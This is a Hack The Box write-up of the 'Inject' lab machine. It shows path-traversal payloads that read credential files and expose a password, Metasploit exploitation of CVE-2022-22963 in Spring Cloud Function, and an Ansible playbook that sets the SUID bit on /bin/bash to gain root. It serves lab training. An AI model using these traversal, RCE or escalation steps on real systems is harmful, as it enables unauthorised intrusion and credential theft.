# Inject
### HACK THE BOX — HTB INJECT Machine  [easy]  WRITEUP....
<img width="584" alt="Screenshot 2023-08-21 at 12 40 16 AM" src="https://github.com/Lynk4/HTB-Writeups/assets/44930131/5f54448a-6360-44d9-88ce-442684e0537f">

Link: https://app.hackthebox.com/machines/533


<img width="1120" alt="Screenshot 2023-08-21 at 12 43 12 AM" src="https://github.com/Lynk4/HTB-Writeups/assets/44930131/5375d80e-24c6-4a82-8f6c-05cfccbb07cd">


Found Two ports open ssh and http running on 8080.
Let's check out the web page.


![web](https://github.com/Lynk4/HTB-Writeups/assets/44930131/63042238-51d8-4e9e-85ee-8e4d48bda091)


Nothing much here....
Let's run dirb to find we pages.


![dirb](https://github.com/Lynk4/HTB-Writeups/assets/44930131/7899b222-86fd-4d9a-b419-eb40e866a4e4)


After a while dirb found an upload page which is interesting.
let's go onto it.


![upload](https://github.com/Lynk4/HTB-Writeups/assets/44930131/c89698ec-3418-4c83-b0ed-c24ab2c9e48c)


Now let's upload a pic and intercept the request in burpsuite.
Send the request to the repeater. For further experiment.
Here we can see the file upload path of the pic.

```
/show_image?img=k.png
```


![burp_1](https://github.com/Lynk4/HTB-Writeups/assets/44930131/9ece9ca9-89e8-414d-9b64-c815828fa5c0)


put that pic url in the header section of the request.
and also change the request form **POST to GET.**


![burp_3](https://github.com/Lynk4/HTB-Writeups/assets/44930131/528f121e-0fbc-4c40-aaa2-1bccaedc0ea4)


Now let's do something cool here.
directory browsering........


```
/show_image?img=../
```

and guess what we got some files.....


![burp_4](https://github.com/Lynk4/HTB-Writeups/assets/44930131/6226b9b9-b113-4f32-87ed-1a6d7573236c)


For the **var** directory.

```
/show_image?img=../../../../../../
```

![burp_var](https://github.com/Lynk4/HTB-Writeups/assets/44930131/8a5ef32a-f2e0-42d5-a230-5bad89490c7a)


let's check the home directory.

```
/show_image?img=../../../../../../home/
```

Found two user's **frank** and **phil**.


![burp_home](https://github.com/Lynk4/HTB-Writeups/assets/44930131/75591ec2-a2e2-4d97-9428-3ca160f1dcbf)


Found something in settings.xml file. In the frank directory.
there's a password for the user phil.


```
/show_image?img=../../../../../../home/frank/.m2/settings.xml
```


Take a note of the password.

  **phil:DocPhillovestoInject123**


![phil_pass](https://github.com/Lynk4/HTB-Writeups/assets/44930131/7a6ead8e-9a22-4e73-a34a-9c3c4c4cb3cf)


perform some additional reconnaissance in the var directory.


```
/show_image?img=../../../../../../var/www/WebApp/HELP.md
```


The website is using **Spring Restful Web Service**.


![recon](https://github.com/Lynk4/HTB-Writeups/assets/44930131/38c25b52-013f-4a98-8d24-4e9e8b635210)


Let's do some recon on the spring restful web service.

guess what found something interesting.....

**CVE-2022-22963** - Spring Cloud Function RCE


![cve](https://github.com/Lynk4/HTB-Writeups/assets/44930131/25a48615-7576-4505-9f78-376a9afb99b5)


For the CVE-2022-22963 there's a metasploit module.
Let's fire up the msfconsole.


```
exploit(multi/http/spring_cloud_function_spel_injection)
```


![meterpreter_1](https://github.com/Lynk4/HTB-Writeups/assets/44930131/d66692a5-fd26-45f5-87ff-90c758622e48)


Set lhost and rhost.
Run the exploit....We got a shell connection.


![meterpreter](https://github.com/Lynk4/HTB-Writeups/assets/44930131/4c248c2d-0484-4eef-b448-d2ad662a8d52)


Now explore the machine for the flags.......

user flag is inside the phil user frank user don't have the permission.
switch to Phil user using the password we found earlier.
**phil:DocPhillovestoInject123**


![user_1](https://github.com/Lynk4/HTB-Writeups/assets/44930131/72c0f642-15a3-40b7-9419-c840ed3913aa)


### Now it's time for privilege escalation......


In order to access root we need to see /opt directory.
There we find automation. In automation playbook_1.yml file is present.
Just copy the playbook_1.yml syntax we are gonna modify it in our local machine after that we will transfer our file that is playbook_2.yml through python http server.


![opt](https://github.com/Lynk4/HTB-Writeups/assets/44930131/b50fc489-7bfe-4293-aaed-ded5c233bd7f)


we can find more about ansible playbook.yml  
here. https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_intro.html

From this:

```
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

To this:
playbook_2.yml file

```
- hosts: localhost
  tasks:
  - name: Get Root
    command: chmod u+s /bin/bash
    become: true
```

Now transfer the playbook_2.yml file to the remote machine.
In our case we are gonna use python http server.


![transfer](https://github.com/Lynk4/HTB-Writeups/assets/44930131/b51c5df9-b14a-47c8-9431-c93c5292d659)


After transferring the playbook_2.yml file 

execute:
```
ls /bin/bash -al
```

```
bash -p
```

Got the root access.


![root_1](https://github.com/Lynk4/HTB-Writeups/assets/44930131/0332f27e-b14e-413a-9aac-8a388a6b53ad)


Go to the root directory for the root flag.


![root](https://github.com/Lynk4/HTB-Writeups/assets/44930131/cd457267-eb9e-46dd-9734-5ac94453b2ba)

I hope this post has been helpful to you.









